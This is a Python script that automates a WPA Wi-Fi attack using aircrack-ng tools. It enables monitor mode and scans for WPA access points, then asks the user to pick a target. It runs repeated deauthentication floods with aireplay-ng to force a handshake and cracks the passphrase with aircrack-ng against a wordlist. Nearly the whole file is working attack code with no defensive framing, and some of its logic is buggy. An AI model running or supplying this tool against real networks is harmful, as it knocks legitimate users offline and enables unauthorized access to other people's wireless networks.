#!/usr/bin/python3


import subprocess
from subprocess import *
import re
import sys
import threading
import time
import os
import csv

DM = open(os.devnull,"w")

W = '\033[0m'  # white (normal)
R = '\033[31m'  # red
G = '\033[32m'  # green
O = '\033[33m'  # orange
B = '\033[34m'  # blue
P = '\033[35m'  # purple
C = '\033[36m'  # cyan
GR = '\033[37m'  # gray



targetbssid = None
targetchanel = None
targetessid = None




def GetWirlessCard():
     try:
      wirelesscard = subprocess.Popen("iwconfig",stdout=subprocess.PIPE,stderr=subprocess.PIPE)
      m = wirelesscard.stdout.read().decode("utf-8")
      match = re.findall('^[A-Za-z]*\d*?[a-z0-9]*', m)
      if match == None:
         print(R+"[-] "+W+"No Wireless Card was found! ")
         sys.exit()
      else:
         return match[0]
     except:
         print(R+"[-] "+W+"aircrack package not installed ! try to use "+B+"'apt-get install aircrack-ng'"+W)
         sys.exit()
def checkMonterMode():
     print(B + "\n\t\t Checking MonitorMode .. \t\t\n")
     try:
      command = ["iwconfig","|","grep","Monitor"]
      checkm = subprocess.Popen(command,stdout=subprocess.PIPE,stderr=DM,shell=True)
      if "Monitor" in checkm.stdout.read().decode("utf-8"):
          print(G +"[*] "+W+ "MonitorMode is " + O + "ON" + W)
          return 1
      else:
          print(R +"[-] "+W+"MonitorMode is " + R + "OFF" + W)
          return 0
     except Exception as ex1:
          print(R+"[-] "+W+"Error! Some Error Was Happen : " +R+ex1+W)
def ShowWirlessCard():
          print(B+"\n\n\n\t\t List Of WirLessCard ..\t\t\n")

          i = 1
          print(P+"[{}] ".format(i)+W+ GetWirlessCard())

def RunModeMonter():
     try:
        if checkMonterMode() == False:
             cmd2 = ["airmon-ng","start",GetWirlessCard()]
             cmd22 = ["airmon-ng start {}".format(GetWirlessCard())]
             modemonter = subprocess.Popen(cmd22, stdout=subprocess.PIPE, stderr=subprocess.PIPE,shell=True)
             modemonter.communicate(timeout=10)

        else:
                 pass
     except Exception as EXC1:
                print("[-] There is some Error that say", EXC1)
                sys.exit()
def RubAirdump():
     try:
         try:
             cmd1 = ["airodump-ng -a --write-interval 1 -w test1 {}".format(GetWirlessCard())]
             proc = subprocess.Popen(cmd1,stdout=DM,stderr=DM,shell=True)
             proc.communicate(timeout=10)
         except TimeoutExpired:
             pass
     except Exception as EXC3:
             print("[-] There is some Error that say at ", EXC3)
             sys.exit()
def ReadCsv():
         global targetbssid, targetchanel
         print(B + "\t\t List Of Wirless AP \t\t\n")
         with open("test1-01.csv",newline='', encoding='utf-8') as csvfile:
              sreader = csv.reader(csvfile,delimiter='\t')
              v = 0
              bssidlist = []
              essidlist = []
              channellist = []
              try:
                 n = 1

                 for i in sreader:
                    if i != []:
                            h = i
                            if h[0].split(",")[-2] is not " " and "WPA" in h[0].split(",")[5]:
                               essid = h[0].split(",")[-2]
                               bssid = h[0].split(",")[0]
                               channel = h[0].split(",")[3]
                               enc = h[0].split(",")[6]
                               print(P+"[{}] ".format(n)+R + "Essid = ",W + h[0].split(",")[-2],B +"Bssid = ",W + h[0].split(",")[0],G + "Channel =",W + h[0].split(",")[3],C +"Enc = ",C+h[0].split(",")[5]  )
                               bssidlist.append(bssid)
                               essidlist.append(essid)
                               channellist.append(channel)
                               n += 1

                 x = True
                 while x is True:
                     try:

                         target = int(input('\n[+] Please Select The Target : '))

                         if target < n:
                             x = False
                         else:
                             print(R + "[-] Error ," + W + " Please Select the Number of target that in the range !" + W)
                             continue
                     except Exception as io:
                            print(io)
                            print(R+"[-] Error , "+W+"Check your Input Date ! ")
                            continue
                 global targetbssid,targetchanel,targetessid
                 time.sleep(2)

                 targetbssid = bssidlist[target-1]
                 targetchanel = channellist[target-1]
                 targetessid = essidlist[target-1]

                 #return targetbssid,targetchanel

              except:
                           pass
def RemoveTempFile():
          try:

              subprocess.Popen(["rm test1-*"],stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True)
              subprocess.Popen(["rm outtest-*"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
          except:

              pass

def Attack():
         try:
                cmd1 = ['airodump-ng','--write-interval','1','--channel',targetchanel,'--bssid',targetbssid,'-w','outtest',GetWirlessCard()]
                subprocess.Popen(cmd1,stdout=DM,stderr=DM)
                time.sleep(5)
                #print(P+"[+]"+G+" Started")
         except Exception as io:
                print(io)
def RunAircrack(xp):

                  print("3"+xp)
                  CMD = 'aircrack-ng outtest-01.cap -b {0} -w {1} '.format(targetbssid,xp)
                  CMD2 = 'aircrack-ng outtest-01.cap -b {} -w /usr/share/metasploit-framework/data/wordlists/password.lst'.format(targetbssid)

                  os.system(CMD)

def fixchannel():
            try:
                cmd = ['airmon-ng','stop',GetWirlessCard()]
                nb = subprocess.Popen(cmd,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
                nb.communicate()
                time.sleep(2)
                cmd2 = ['airmon-ng','start',GetWirlessCard(),targetchanel]
                nb = subprocess.Popen(cmd2, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                nb.communicate()
            except Exception as iop:
                print(iop +"in fuction fixedchannel")
def stopmode():
            try:
               cmd = ['airmon-ng', 'stop', GetWirlessCard()]
               nbn = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
               nbn.communicate()
               time.sleep(2)
            except:
                pass

def AttackClint(cvb):
         try:
             DM.read()
         except:
             pass
         x = True
         print(P + "[*] " + W + "Runnig " + R + "Aireplay Death Attack" + W)
         while True:
               try:

                   cmd = ['aireplay-ng','-0','2','-a',targetbssid,GetWirlessCard()]
                   attackc = subprocess.Popen(cmd,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
                   attackc.communicate()
                   time.sleep(10)
                   try:
                              time.sleep(1)
                              cmd = ['aircrack-ng','outtest-01.cap','--bssid',targetbssid,'-w','ktools/ktool.txt']
                              n1 = subprocess.Popen(cmd,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
                              sv = n1.stdout.read().decode('utf-8')
                              time.sleep(1)
                              if sv.find("Current passphrase") is not -1 or sv.find("Passphrase") is not -1:

                                    print(B + "[*] " + W + "The WPA " + G + "HandShake " + W + "Was Found !")
                                    print(B + "[*] " + W + "Crack it using  " + G + "Aircrack-ng " + W + ", good luck !")

                                    RunAircrack(cvb)
                                    break

                              else :
                                 print(B + "[?] " + W + "Try to Get Handshake ...!",sv.find("passphrase"))

                                 time.sleep(2)
                                 continue

                   except Exception as io:
                                    print(io)
                                    print(R+"[-] "+W+"Can't Found output File!")
                                    continue
               except Exception as io:
                                    print(io)

def inputfi():
    while True:
        try:
            ino = input(P + "\n[+] " + W + "Please input Path of Wordlist : ")
            if os.path.isfile(ino) is True:

                return ino
                break
            else:
                print("[-] The Wordlist File Not found ")
                continue
        except Exception as iop:
            print(iop)
            continue





def WpaAttack():

   try:
        RemoveTempFile()
        ino = inputfi()
        print("1"+ino)
        ShowWirlessCard()
        RunModeMonter()
        checkMonterMode()
        sp = threading.Thread(target=RubAirdump())
        sp.start()
        sp.join()
        se = threading.Thread(target=ReadCsv())
        se.start()
        se.join()
        print("\n"+P+"[*] "+W+"Your Target is "+G+targetessid+W+"!")
        sk = threading.Thread(target=fixchannel())
        sk.start()
        sk.join()

        sa = threading.Thread(target=Attack())
        sa.start()
        sa.join()

        sc = threading.Thread(target=AttackClint(ino),args=ino)
        sc.start()
        time.sleep(5)
        stopmode()
        RemoveTempFile()
   except KeyboardInterrupt:
         pass







